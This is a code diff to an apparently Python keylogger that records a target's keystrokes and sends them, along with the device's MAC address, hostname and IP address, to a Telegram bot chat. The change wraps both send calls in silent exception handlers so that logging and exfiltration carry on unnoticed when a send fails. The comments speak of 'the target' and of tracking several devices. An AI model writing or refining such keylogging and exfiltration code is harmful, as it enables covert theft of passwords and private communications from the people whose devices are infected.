@@ -32,13 +32,19 @@ async def main(): # recursive function for keylogging and outputing
         try:
             global buffer_for_tg, modified_time # initializing buffer here to clear it after sending a message
             if TOKEN != "" and CHAT_ID != "":
-                await bot.send_message(CHAT_ID, f"device connected:\nMAC adress: {mac_address}\nHost name: {hostname}\nIP address: {ip_address}")
+                try:
+                    await bot.send_message(CHAT_ID, f"device connected:\nMAC adress: {mac_address}\nHost name: {hostname}\nIP address: {ip_address}")
+                except Exception:
+                    pass
             while True:
                 if buffer_for_tg != "":
                     if time.time() - modified_time > 2.6: # if the target didn't type anything for 2.6 seconds - 1) start a new row in .txt file 2) send TG message with typed chars by bot then clear the buffer
                         if TOKEN != "" and CHAT_ID != "":
-                            await bot.send_message(CHAT_ID, f"[{mac_address}]: {buffer_for_tg}") # MAC address before typed chars in case of multiple devices tracked
-                            buffer_for_tg = "" # cleaning the buffer
+                            try:
+                                await bot.send_message(CHAT_ID, f"[{mac_address}]: {buffer_for_tg}") # MAC address before typed chars in case of multiple devices tracked
+                                buffer_for_tg = "" # cleaning the buffer
+                            except Exception:
+                                pass
                     await asyncio.sleep(0.2) # unloading CPU
         except KeyboardInterrupt: # bypassing KeyboardInterrupt error
             main()
